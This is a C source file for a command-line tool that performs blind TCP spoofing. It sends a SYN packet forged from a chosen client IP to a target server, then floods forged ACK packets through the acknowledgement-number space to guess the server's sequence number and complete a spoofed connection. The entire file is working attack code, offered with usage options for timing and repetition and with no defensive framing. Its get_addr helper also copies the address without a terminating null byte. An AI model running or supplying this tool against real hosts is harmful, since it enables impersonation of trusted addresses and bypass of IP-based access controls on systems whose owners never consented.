#include "tcp_spoof.h"
#include <unistd.h>
#include <getopt.h>

int get_low_port(char *s)
{
    return atoi(s); 
}

int get_high_port(char *s)
{
    char *high_port = strchr(s, (int)'-');
    if (high_port == NULL) {
        return atoi(s);
    }

    return atoi(high_port+1);
}

char *get_addr(char *addr_port)
{
    char *colon = strchr(addr_port, (int)':');
    if (colon == NULL) {
        return addr_port;
    }

    int addr_len = colon - addr_port;
    if (addr_len > 15) {
        return NULL;
    } 

    char *ret = malloc(addr_len);
    if (ret == NULL) {
        return ret;
    }

    memcpy(ret, addr_port, addr_len);

    return ret; 
}

int get_port(char *addr_port)
{
    char *colon = strchr(addr_port, (int)':');
    if (colon == NULL) {
        return -1;
    }

    return atoi(colon + 1);
}

int timediff_us(struct timeval *t1, struct timeval *t2)
{
    return (t2->tv_sec - t1->tv_sec)*1000000 +
        (t2->tv_usec - t1->tv_usec);
}

void delay_until(struct timeval *last_time, int delay)
{
    struct timeval cur_time;
    gettimeofday(&cur_time, NULL);
    int diff;
    while ((diff = timediff_us(last_time, &cur_time)) < delay) {
        if ((delay - diff) > 50) {
            usleep(delay - diff - 50);
        }
        gettimeofday(&cur_time, NULL);
    }
    gettimeofday(last_time, NULL);
}

void print_usage(char *prog)
{
    printf("\nUsage: %s [options] client_ip server_ip:server_port\n\n", prog);
    printf("\tSends a SYN packet spoofed from client_ip to server_ip:server_port,\n");
    printf("\tThen attempts to guess the ACK field to complete the \"connection\".\n\n");
    printf("Options:\n");
    printf("    --delay (-d)  : microseconds to delay between each send\n");
    printf("    --repeat (-r) : number of times to loop. 0 for inifinite\n");
    printf("    --time (-t)   : time (in milliseconds) to run for. Overrides -r.\n");
    printf("    --ack (-a)    : start acknowledgement (default 0)\n");
    printf("\n");
}

int main(int argc, char *argv[])
{
    struct pkt_data pkt;
    int dport_begin, dport_end;
    struct timeval last_time;
    int opt; // opt_ind;
    int opt_index;
    struct option long_opts[] = {
        {"delay", 1, 0, 'd'},
        {"repeat", 1, 0, 'r'},
        {"time", 1, 0, 't'},
        {"ack", 1, 0, 'a'},
        {"count", 1, 0, 'c'},
        {0, 0, 0, 0}
    };
    char *saddr;
    char *daddr_port;
    char *daddr;
    int dport;

    int delay = 0;
    int repeat = 1;
    int time = 0;
    uint32_t start_ack = 0;
    int tot_pkts = -1;

    while ((opt = getopt_long(argc, argv, "d:r:t:a:c:", long_opts, &opt_index)) != -1) {
        switch (opt) {
        case 'd':
            delay = atoi(optarg);
            break;
        case 'r':
            repeat = atoi(optarg);
            if (repeat == 0)
                repeat = -1;
            break;
        case 't':
            time = atoi(optarg);
            break;
        case 'a':
            start_ack = atoi(optarg);
            break;
        case 'c':
            tot_pkts = atoi(optarg);
            break;
        default:
            print_usage(argv[0]);
        }
    }

    if (time != 0) {
        repeat = -1;
    }

    if (optind+2 != argc) {
        //usage
        print_usage(argv[0]);
        return -1;
    } 

    saddr = argv[optind++];
    daddr_port = argv[optind++];   // site_ip:site_port

    daddr = get_addr(daddr_port);
    dport = get_port(daddr_port);

    /*
    printf("saddr: [%s]\n", saddr);
    printf("sport: [%d]\n", sport_low);
    printf("daddr: [%s]\n", daddr);
    printf("dport: [%d]\n", dport);
    */
 
    init_sock();

    pkt.daddr = inet_addr(daddr);
    pkt.saddr = inet_addr(saddr);
    pkt.dport = htons(dport);
    //pkt.sport = (uint16_t)(rand() & 0xffff);
    pkt.sport = htons(11111);
    
    pkt.id = 1234;
    pkt.ttl = 64;

    pkt.ack = 0;
    pkt.seq = 0xa1a2a3a4;

    pkt.flags = TH_SYN;

    tcp_forge_xmit(&pkt, NULL, 0);

    unsigned int percent_done;
    unsigned int last_pct_done = 0;
    struct timeval end_time;

    gettimeofday(&end_time, NULL);
    end_time.tv_usec += 1000*time;
    end_time.tv_sec += (end_time.tv_usec / 1000000);
    end_time.tv_usec %= 1000000;

    gettimeofday(&last_time, NULL);


    

    // Now we'll guess the ACK
    //pkt.seq = htonl(ntohl(pkt.seq) + 1);
    pkt.seq++;
    pkt.flags = TH_ACK;


    uint32_t ack;

    do {

        for (ack=start_ack; ack!=(start_ack-1) && tot_pkts; ack++) {


            if ((ack % 0x0fffff) == 0) {
                pkt.flags = TH_SYN;
                pkt.seq--;
                tcp_forge_xmit(&pkt, NULL, 0);
                pkt.seq++;
                pkt.flags = TH_ACK;
            }

rerun:
            delay_until(&last_time, delay);

            //pkt.ack = htonl(ack);
            pkt.ack = ack;
            
            if (tcp_forge_xmit(&pkt, NULL, 0)) {
                fprintf(stderr, "noo\n");
                return -1;
            }
            if (tot_pkts != -1)
                tot_pkts--;
        }

        if (repeat > 0)
            repeat--;

        if (repeat == 0)
            break;
        if (time != 0) {
            struct timeval cur_time;
            gettimeofday(&cur_time, NULL);
            if ((cur_time.tv_sec > end_time.tv_sec) ||
             (cur_time.tv_sec == end_time.tv_sec && cur_time.tv_usec > end_time.tv_usec)) {
                break;
            }
        } 
    } while (1);

    return 0;    
}
